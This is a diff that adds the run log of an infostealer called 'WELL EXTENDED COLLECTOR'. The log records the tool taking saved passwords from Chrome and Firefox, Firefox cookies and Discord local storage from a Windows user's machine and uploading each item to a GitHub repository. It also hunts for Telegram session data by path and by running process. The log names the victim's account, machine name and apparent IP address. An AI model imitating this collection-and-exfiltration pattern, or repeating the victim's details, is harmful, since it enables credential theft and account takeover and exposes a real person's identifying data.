@@ -1,0 +1,50 @@
+2026-08-16 02:41:55.267809: === WELL EXTENDED COLLECTOR STARTED ===
+2026-08-16 02:41:55.267809: Client ID: DESKTOP-V9T8264_max_26_121_173_127
+2026-08-16 02:41:55.268810: Client Folder: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155
+2026-08-16 02:41:55.268810: [*] Collecting browser data...
+2026-08-16 02:41:55.268810: [Chrome] Found: C:\Users\max\AppData\Local\Google\Chrome\User Data
+2026-08-16 02:41:55.269810: [Chrome] Passwords (db) copied: Default
+2026-08-16 02:41:57.224979: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/passwords_Chrome_Default.db
+2026-08-16 02:41:58.968119: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/passwords_Chrome_Default.txt
+2026-08-16 02:41:58.970120: [Edge] Not found
+2026-08-16 02:41:58.970120: [Opera] Not found
+2026-08-16 02:41:58.970120: [Opera GX] Found: C:\Users\max\AppData\Roaming\Opera Software\Opera GX Stable
+2026-08-16 02:41:58.971120: [Brave] Not found
+2026-08-16 02:41:58.971120: [Vivaldi] Not found
+2026-08-16 02:41:58.971120: [Yandex] Not found
+2026-08-16 02:41:58.971120: [Slimjet] Not found
+2026-08-16 02:41:58.971120: [Chromium] Not found
+2026-08-16 02:41:58.971120: [Firefox] Found: C:\Users\max\AppData\Roaming\Mozilla\Firefox\Profiles
+2026-08-16 02:41:58.974121: [Firefox] Cookies copied: q7hsh4mr.default-release
+2026-08-16 02:42:02.202369: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/cookies_Firefox_q7hsh4mr.default-release.db
+2026-08-16 02:42:02.205369: [Firefox] Passwords (json) copied: q7hsh4mr.default-release
+2026-08-16 02:42:04.018511: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/passwords_Firefox_q7hsh4mr.default-release.json
+2026-08-16 02:42:05.720651: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/passwords_Firefox_q7hsh4mr.default-release.txt
+2026-08-16 02:42:05.722653: [Waterfox] Not found
+2026-08-16 02:42:05.722653: [Pale Moon] Not found
+2026-08-16 02:42:05.723652: [LibreWolf] Not found
+2026-08-16 02:42:05.723652: [*] Collecting all Telegram clients...
+2026-08-16 02:42:05.723652: [Telegram Desktop] Not found: C:\Users\max\AppData\Roaming\Telegram Desktop\tdata
+2026-08-16 02:42:05.723652: [Telegram Portable] Not found: C:\Users\max\Telegram\tdata
+2026-08-16 02:42:05.723652: [Ayugram] Not found: C:\Users\max\AppData\Roaming\Ayugram\tdata
+2026-08-16 02:42:05.723652: [Ayugram Portable] Not found: C:\Users\max\Ayugram\tdata
+2026-08-16 02:42:05.723652: [Plus Messenger] Not found: C:\Users\max\AppData\Roaming\Plus Messenger\tdata
+2026-08-16 02:42:05.724651: [Telegreat] Not found: C:\Users\max\AppData\Roaming\Telegreat\tdata
+2026-08-16 02:42:05.724651: [Telegram X] Not found: C:\Users\max\AppData\Roaming\Telegram X\tdata
+2026-08-16 02:42:05.724651: [Unigram] Not found: C:\Users\max\AppData\Local\Unigram\Data\tdata
+2026-08-16 02:42:05.724651: [Telegram Beta] Not found: C:\Users\max\AppData\Roaming\Telegram Desktop Beta\tdata
+2026-08-16 02:42:05.724651: [Kotatogram] Not found: C:\Users\max\AppData\Roaming\Kotatogram\tdata
+2026-08-16 02:42:05.724651: [TDesktop] Not found: C:\Users\max\AppData\Roaming\TDesktop\tdata
+2026-08-16 02:42:05.724651: [Graph Messenger] Not found: C:\Users\max\AppData\Roaming\Graph Messenger\tdata
+2026-08-16 02:42:05.724651: [*] Searching for Telegram clients by processes...
+2026-08-16 02:42:05.732651: [PROCESS] Found tdata near: D:\gigagram\tdata
+2026-08-16 02:42:33.478096: [Process_AyuGram] Error copying: [('D:\\gigagram\\tdata\\user_data\\cache\\1\\binlog', 'C:\\Users\\max\\AppData\\Local\\Temp\\well_dump_DESKTOP-V9T8264_max_26_121_173_127\\telegram_Process_AyuGram\\user_data\\cache\\1\\binlog', '[WinError 33] Процесс не может получить доступ к файлу, так как часть этого файла заблокирована другим процессом'), ('D:\\gigagram\\tdata\\user_data\\media_cache\\1\\binlog', 'C:\\Users\\max\\AppData\\Local\\Temp\\well_dump_DESKTOP-V9T8264_max_26_121_173_127\\telegram_Process_AyuGram\\user_data\\media_cache\\1\\binlog', '[WinError 33] Процесс не может получить доступ к файлу, так как часть этого файла заблокирована другим процессом'), ('D:\\gigagram\\tdata\\user_data#2\\cache\\0\\binlog', 'C:\\Users\\max\\AppData\\Local\\Temp\\well_dump_DESKTOP-V9T8264_max_26_121_173_127\\telegram_Process_AyuGram\\user_data#2\\cache\\0\\binlog', '[WinError 33] Процесс не может получить доступ к файлу, так как часть этого файла заблокирована другим процессом'), ('D:\\gigagram\\tdata\\user_data#2\\media_cache\\0\\binlog', 'C:\\Users\\max\\AppData\\Local\\Temp\\well_dump_DESKTOP-V9T8264_max_26_121_173_127\\telegram_Process_AyuGram\\user_data#2\\media_cache\\0\\binlog', '[WinError 33] Процесс не может получить доступ к файлу, так как часть этого файла заблокирована другим процессом'), ('D:\\gigagram\\tdata\\user_data#3\\cache\\1\\binlog', 'C:\\Users\\max\\AppData\\Local\\Temp\\well_dump_DESKTOP-V9T8264_max_26_121_173_127\\telegram_Process_AyuGram\\user_data#3\\cache\\1\\binlog', '[WinError 33] Процесс не может получить доступ к файлу, так как часть этого файла заблокирована другим процессом'), ('D:\\gigagram\\tdata\\user_data#3\\media_cache\\1\\binlog', 'C:\\Users\\max\\AppData\\Local\\Temp\\well_dump_DESKTOP-V9T8264_max_26_121_173_127\\telegram_Process_AyuGram\\user_data#3\\media_cache\\1\\binlog', '[WinError 33] Процесс не может получить доступ к файлу, так как часть этого файла заблокирована другим процессом'), ('D:\\gigagram\\tdata\\working', 'C:\\Users\\max\\AppData\\Local\\Temp\\well_dump_DESKTOP-V9T8264_max_26_121_173_127\\telegram_Process_AyuGram\\working', '[WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом')]
+2026-08-16 02:42:33.483097: [*] Collecting additional data...
+2026-08-16 02:42:33.523099: [DISCORD] Copied: C:\Users\max\AppData\Roaming\discord\Local Storage\leveldb
+2026-08-16 02:42:39.536608: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/discord_discord.zip
+2026-08-16 02:42:39.540608: [*] Collecting system information...
+2026-08-16 02:42:39.757125: [SYSTEM] Saved information
+2026-08-16 02:42:41.608273: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/system_info.json
+2026-08-16 02:42:43.702934: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/README.md
+2026-08-16 02:42:43.704935: [*] Generating report...
+2026-08-16 02:42:45.474071: [GITHUB] Uploaded: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_024155/FINAL_REPORT.txt
